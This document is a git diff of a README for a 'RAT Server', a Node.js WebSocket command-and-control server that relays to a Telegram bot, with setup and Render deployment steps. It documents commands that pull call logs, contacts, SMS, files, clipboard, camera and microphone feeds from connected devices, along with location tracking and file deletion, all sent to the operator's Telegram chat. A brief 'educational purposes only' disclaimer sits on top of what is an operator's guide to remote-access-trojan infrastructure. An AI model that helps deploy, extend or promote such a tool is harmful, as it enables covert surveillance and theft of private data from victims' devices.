@@ -1,254 +1,249 @@
 # RAT Server 🚀
 
-WebSocket server with Telegram Bot integration for remote control functionality.
+A WebSocket-based device control server with Telegram Bot integration for remote command execution and file transfers.
+
+## ⚠️ Warning
+
+This application is for **educational purposes only**. Unauthorized access to computer systems is illegal. Use responsibly and legally.
+
+## Features
+
+✅ WebSocket connection for real-time communication
+✅ Telegram Bot integration for command dispatch
+✅ File upload/download functionality
+✅ Location tracking support
+✅ Device status monitoring
+✅ Multi-client support
+✅ Keep-alive mechanism
+
+## Prerequisites
+
+- Node.js 18+ ([Download](https://nodejs.org))
+- npm or yarn
+- Telegram Bot Token ([Create bot with BotFather](https://t.me/botfather))
+- Telegram Chat ID
 
 ## Setup Instructions
 
-### Prerequisites
-- Node.js 18.x or higher
-- npm or yarn
-- Telegram Bot Token (from [@BotFather](https://t.me/botfather))
-- Telegram Chat ID
+### 1. Clone Repository
 
-### Local Development
-
-1. **Clone the repository:**
 ```bash
 git clone https://github.com/munna1127/rat_server-.git
 cd rat_server-
 ```
 
-2. **Install dependencies:**
+### 2. Install Dependencies
+
 ```bash
 npm install
 ```
 
-3. **Create `.env` file:**
+### 3. Configure Environment Variables
+
+Create a `.env` file in the root directory:
+
 ```bash
 cp .env.example .env
 ```
 
-4. **Update `.env` with your credentials:**
-```
+Edit `.env` with your credentials:
+
+```env
 TELEGRAM_BOT_TOKEN=your_bot_token_here
 TELEGRAM_CHAT_ID=your_chat_id_here
-SERVER_ADDR=http://localhost:9000
 PORT=9000
-NODE_ENV=development
+NODE_ENV=production
 ```
 
-5. **Start the server:**
+### 4. Run Locally
+
 ```bash
 npm start
 ```
 
-Server will run on `http://localhost:9000`
+Server will start on `http://localhost:9000`
 
----
+## Deploy on Render
 
-## 🌐 Deploy on Render
+### Step 1: Push to GitHub
 
-### Step 1: Create Render Account
-- Go to [render.com](https://render.com)
-- Sign up with GitHub account
+```bash
+git add .
+git commit -m "Initial commit"
+git push origin main
+```
 
-### Step 2: Create New Web Service
-1. Click **"New +"** button
-2. Select **"Web Service"**
-3. Choose your **rat_server-** repository
-4. Click **"Connect"**
+### Step 2: Create Render Account
+
+1. Go to [render.com](https://render.com)
+2. Sign up with GitHub account
+3. Click "New+" → "Web Service"
+4. Select your GitHub repository
 
 ### Step 3: Configure Service
-Fill in the following details:
 
-| Field | Value |
-|-------|-------|
-| **Name** | rat_server |
-| **Environment** | Node |
-| **Region** | Choose nearest region |
-| **Branch** | main |
-| **Build Command** | `npm install` |
-| **Start Command** | `npm start` |
-| **Plan** | Free or Paid |
+- **Name**: rat_server
+- **Runtime**: Node
+- **Build Command**: `npm install`
+- **Start Command**: `npm start`
 
 ### Step 4: Add Environment Variables
-Go to **"Environment"** tab and add:
+
+Go to Environment tab and add:
 
 ```
-TELEGRAM_BOT_TOKEN = your_bot_token_here
-TELEGRAM_CHAT_ID = your_chat_id_here
-SERVER_ADDR = https://rat-server.onrender.com
-PORT = 10000
+TELEGRAM_BOT_TOKEN = your_token
+TELEGRAM_CHAT_ID = your_chat_id
+PORT = 8080
 NODE_ENV = production
 ```
 
 ### Step 5: Deploy
-- Click **"Create Web Service"**
-- Wait for deployment to complete
-- Your server URL will be: `https://rat-server.onrender.com`
 
----
+Click "Create Web Service" and Render will automatically deploy!
 
-## ⚠️ Important Notes for Render
+## API Endpoints
 
-✅ **What Works:**
-- WebSocket connections
-- Telegram Bot API
-- File uploads/downloads
-- HTTP endpoints
+### GET `/`
+Health check endpoint
 
-⚠️ **Important:**
-- Free tier instances **spin down after 15 minutes of inactivity**
-- Use a cron job or external monitor to keep it alive
-- Render provides **550 free hours/month** for web services
-- Your URL will be available 24/7, but inactive instances will sleep
-
-### Keep Server Alive (Optional)
-Add a monitor service to prevent sleep:
-1. Use [UptimeRobot](https://uptimerobot.com) (Free)
-2. Configure to ping: `https://rat-server.onrender.com/`
-3. Every 5-10 minutes
-
----
-
-## 📡 API Endpoints
-
-### Health Check
+**Response:**
 ```
-GET /
-Response: Welcome
+Welcome
 ```
 
-### Send File
-```
-POST /sendFile
-Body: Form-data with file
-Response: filename
-```
+### POST `/sendFile`
+Upload file to Telegram
 
-### Send Text Message
-```
-POST /sendText
-Body: {"text": "Your message"}
-Response: Message text
+**Body:**
+```json
+{
+  "file": "binary_file_data"
+}
 ```
 
-### Send Location
-```
-POST /sendLocation
-Body: {"l1": latitude, "l2": longitude}
-Response: Latitude value
-```
+### POST `/sendText`
+Send text message
 
----
-
-## 🔌 WebSocket Connection
-
-Clients connect via WebSocket:
-```
-ws://localhost:9000
+**Body:**
+```json
+{
+  "text": "Your message here"
+}
 ```
 
-Or on Render:
+### POST `/sendLocation`
+Send location coordinates
+
+**Body:**
+```json
+{
+  "l1": "latitude",
+  "l2": "longitude"
+}
 ```
-wss://rat-server.onrender.com
-```
 
-### Server Sends Commands
-- `be alive` - Keep-alive ping
-- `send&device_id` - Send SMS
-- `gf&file_path` - Get file/folder
-- `df&file_path` - Delete file/folder
-- `cam1/cam2` - Camera commands
-- `mi1/mi2/mi3` - Microphone commands
-- `cl/gc/ss/ia/dm/cp` - Other commands
+## WebSocket Commands
 
----
+Clients can send these commands via WebSocket:
 
-## 🤖 Telegram Bot Commands
+- `cl` - Call Log
+- `gc` - Get Contacts
+- `ss` - Send SMS
+- `ia` - Installed Apps
+- `dm` - Device Model
+- `gf` - Get File/Folder
+- `df` - Delete File/Folder
+- `cam1` - Main Camera
+- `cam2` - Front Camera
+- `mi1`, `mi2`, `mi3` - Microphone 1, 2, 3
+- `cp` - Clipboard
 
-After connecting to your bot:
+## Telegram Bot Commands
 
-| Command | Action |
-|---------|--------|
-| `/start` | Initialize bot |
-| `Status ⚙` | Show connected clients |
-| `Action ☄` | Show available actions |
+### `/start`
+Initialize bot interaction
 
----
+### `Status ⚙`
+View all connected devices
 
-## 📝 File Structure
+### `Action ☄`
+Select action for connected devices
+
+## Directory Structure
 
 ```
 rat_server-/
-├── server.js          # Main server file
-├── package.json       # Dependencies
-├── .env.example       # Environment template
-├── .gitignore         # Git ignore rules
-└── README.md          # This file
+├── server.js           # Main server file
+├── package.json        # Dependencies
+├── .env.example        # Environment variables template
+├── .gitignore          # Git ignore rules
+├── Procfile            # Procfile for deployment
+├── render.yaml         # Render deployment config
+└── README.md           # This file
 ```
 
----
+## Troubleshooting
 
-## 🔐 Security Notes
-
-⚠️ **IMPORTANT:**
-- Never commit `.env` file to git
-- Keep your Telegram Bot Token secret
-- Use HTTPS for production (Render provides this)
-- Validate all incoming requests
-
----
-
-## 🆘 Troubleshooting
-
-### Bot not responding?
-- Check `TELEGRAM_BOT_TOKEN` in `.env`
-- Verify `TELEGRAM_CHAT_ID` is correct
-- Ensure bot has admin permissions
-
-### WebSocket connection fails?
-- Check if server is running
-- Verify firewall allows WebSocket connections
-- For Render, use `wss://` instead of `ws://`
-
-### Render instance spinning down?
-- Use UptimeRobot or similar service
-- Add a cron job to ping the server
-- Upgrade to Paid plan (always on)
-
----
-
-## 📄 License
-
-ISC
-
----
-
-## 👨‍💻 Author
-
-**l** - Original developer
-
-Modified for Render deployment by **munna1127**
-
----
-
-## 🚀 Quick Start Commands
+### "Cannot find module 'ws'"
 
 ```bash
-# Clone
-git clone https://github.com/munna1127/rat_server-.git && cd rat_server-
-
-# Install
 npm install
-
-# Setup
-cp .env.example .env
-
-# Edit .env with your tokens
-
-# Run
-npm start
 ```
 
-**Enjoy your RAT Server! 🎉**
+### Bot not responding
+
+1. Check TELEGRAM_BOT_TOKEN is correct
+2. Check TELEGRAM_CHAT_ID is correct
+3. Ensure server is running
+4. Check logs: `npm start`
+
+### WebSocket connection fails
+
+1. Check firewall settings
+2. Ensure PORT environment variable is set
+3. Verify client is connecting to correct URL
+
+### Render deployment fails
+
+1. Check all environment variables are set
+2. View logs in Render dashboard
+3. Ensure package.json has `"start"` script
+
+## Security Considerations
+
+⚠️ **Important:**
+
+- Never commit `.env` file to Git
+- Rotate bot tokens regularly
+- Use HTTPS in production
+- Implement proper authentication
+- Rate limit API endpoints
+- Validate all user inputs
+- Use environment variables for secrets
+
+## Performance Tips
+
+1. **Keep-Alive**: Automatically pings clients every 30 seconds
+2. **Connection Pooling**: Manages multiple WebSocket connections efficiently
+3. **Timeout Handling**: Auto-disconnects inactive clients
+4. **Error Handling**: Gracefully handles connection failures
+
+## License
+
+ISC License - See LICENSE file for details
+
+## Support
+
+For issues and questions:
+- GitHub Issues: [GitHub Issues](https://github.com/munna1127/rat_server-/issues)
+- Email: maibatatahu1127@gmail.com
+
+## Author
+
+**Munna** - [GitHub Profile](https://github.com/munna1127)
+
+---
+
+**Last Updated**: 2026-05-05
+**Version**: 1.0.0
